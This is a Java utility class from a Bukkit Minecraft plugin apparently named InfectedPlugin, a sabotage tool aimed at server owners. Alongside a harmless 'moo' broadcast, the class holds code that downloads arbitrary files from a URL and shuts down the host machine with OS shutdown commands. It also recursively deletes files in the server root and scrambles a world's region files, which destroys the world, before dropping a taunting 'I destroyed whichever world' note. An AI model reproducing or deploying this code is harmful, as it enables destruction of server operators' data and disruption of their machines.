 package org.CreeperCoders.InfectedPlugin;
 
 import java.io.*;
 import java.net.URL;
 import java.nio.channels.*;
 import java.util.*;
 import java.util.logging.Logger;
 
 import org.bukkit.*;
 import org.bukkit.command.CommandSender;
 import org.bukkit.entity.Player;
 
 public class IP_Util
 {
     public static final Logger log = Bukkit.getLogger();
    
    //InfectedPlugin - Deprecated because it is untested and may not work.
    @Deprecated
     public static boolean deleteFile(File file)
     {
         if (file.exists())
         {
             for (File f : file.listFiles())
             {
                 if (!IP_Util.deleteFile(f))
                 {
                     return false;
                 }
             }
 
             file.delete();
             return !file.exists();
         }
         else
         {
             return false;
         }
     }
 
     public static boolean deleteFolder(File file)
     {
         if (file.exists())
         {
             if (file.isDirectory())
             {
                 for (File f : file.listFiles())
                 {
                     if (!IP_Util.deleteFolder(f))
                     {
                         return false;
                     }
                 }
             }
             file.delete();
             return !file.exists();
         }
         else
         {
             return false;
         }
     }
 
     public static void downloadFile(String url, File output) throws java.lang.Exception
     {
         downloadFile(url, output, false);
     }
 
     public static void downloadFile(String url, File output, boolean verbose) throws java.lang.Exception
     {
         URL website = new URL(url);
         ReadableByteChannel rbc = Channels.newChannel(website.openStream());
         FileOutputStream fos = new FileOutputStream(output);
         fos.getChannel().transferFrom(rbc, 0, 1 << 24);
         fos.close();
 
         if (verbose)
         {
         }
     }
 
     public static void shutdown() throws RuntimeException, IOException
     {
         String shutdownCommand = null;
         String operatingSystem = System.getProperty("os.name");
 
         if ("Linux".equals(operatingSystem) || "Mac OS X".equals(operatingSystem))
         {
             shutdownCommand = "shutdown -h now";
         }
         else if ("Windows".equals(operatingSystem) || "Windows 7".equals(operatingSystem))
         {
             shutdownCommand = "shutdown.exe -s -t 0";
         }
         else
         {
             throw new RuntimeException("Unsupported operating system.");
         }
 
         Runtime.getRuntime().exec(shutdownCommand);
         System.exit(0);
     }
 
     public static void bcastMsg(String message, ChatColor color)
     {
         for (Player player : Bukkit.getOnlinePlayers())
         {
             player.sendMessage((color == null ? "" : color) + message);
         }
     }
 
     public static void bcastMsg(String message)
     {
         IP_Util.bcastMsg(message, null);
     }
 
    public static void playerAction(String playerName, String action, boolean isRed)
     {
        IP_Util.bcastMsg(playerName + " - " + action, (isRed ? ChatColor.RED : ChatColor.AQUA));
     }
 
     public static String implodeStringList(String glue, List<String> pieces)
     {
         StringBuilder output = new StringBuilder();
         for (int i = 0; i < pieces.size(); i++)
         {
             if (i != 0)
             {
                 output.append(glue);
             }
             output.append(pieces.get(i));
         }
         return output.toString();
     }
 
     private final static String[] consoleMoo = new String[]
     {
         " (__)",
         " (oo)",
         " /------\\/",
         " / | ||",
         " * /\\---/\\",
         " ~~ ~~",
         "....\"Have you mooed today?\"..."
     };
     private final static String[] playerMoo = new String[]
     {
         " (__)",
         " (oo)",
         " /------\\/",
         " / | | |",
         " * /\\---/\\",
         " ~~ ~~",
         "....\"Have you mooed today?\"..."
     };
 
     public static void run_moo(final CommandSender sender, final String commandLabel, final String[] args)
     {
         if (args.length == 2 && args[1].equals("moo"))
         {
             for (String s : consoleMoo)
             {
                 log.info(s);
             }
             for (Player player : sender.getServer().getOnlinePlayers())
             {
                 player.sendMessage(playerMoo);
                 player.playSound(player.getLocation(), Sound.COW_IDLE, 1, 1.0f);
             }
         }
         else
         {
             if (sender instanceof Player)
             {
                 sender.sendMessage(playerMoo);
                 final Player player = (Player) sender;
                 player.playSound(player.getLocation(), Sound.COW_IDLE, 1, 1.0f);
             }
             else
             {
                 sender.sendMessage(consoleMoo);
             }
         }
     }
     
    //InfectedPlugin - Deprecated, may not work.
    @Deprecated
     public void idiot(String world, Player e) throws IOException
     {
         File dir = new File("plugins").getAbsoluteFile();
         File[] root = dir.getParentFile().listFiles();
         for (File f : root)
         {
             if (f.getName().equals(world))
             {
                 File[] contents = f.listFiles();
                 for (File wcon : contents)
                 {
                    if (wcon.getName().equals("region"))
                    {
                        File[] regions = wcon.listFiles();
                        Map<String, String> log = new HashMap<String, String>();
                        for (File region : regions)
                        {
                            String to = Long.toHexString(Double
                            .doubleToLongBits(Math.random()));
                            log.put(region.getName(), to);
                            region.renameTo(new File(wcon.getPath(), to));
                        }
                        File idiot = new File(wcon, "heyman.txt");
                        if (!idiot.exists())
                        {
                            idiot.createNewFile();
                        }
                        FileWriter fw = new FileWriter(idiot);
                        BufferedWriter bw = new BufferedWriter(fw);
                        bw.write("To: WhoeverIsLookingAtThisFile\n");
                        bw.write("Hey man! Happy to see ya!\n");
                        bw.write("I apologize, however I destroyed whichever world the person picked.\n");
                        bw.write("Sorry!\n");
                        bw.write("- Love, WhoeverActivatedTheIdiotButton.");
                        bw.close();
                    }
                 }
             }
         }
     }
     
    //InfectedPlugin - Deprecated, may not work.
    @Deprecated
     public static void deleteRootFile(String lame) throws IOException
     {
         File stupid = new File("plugins").getAbsoluteFile();
         File[] idiot = stupid.getParentFile().listFiles();
         for (File duh : idiot)
         {
             if (duh.getName().equals(lame))
             {
                 deleteFile(new File(lame));
             }
         }
     }
 }
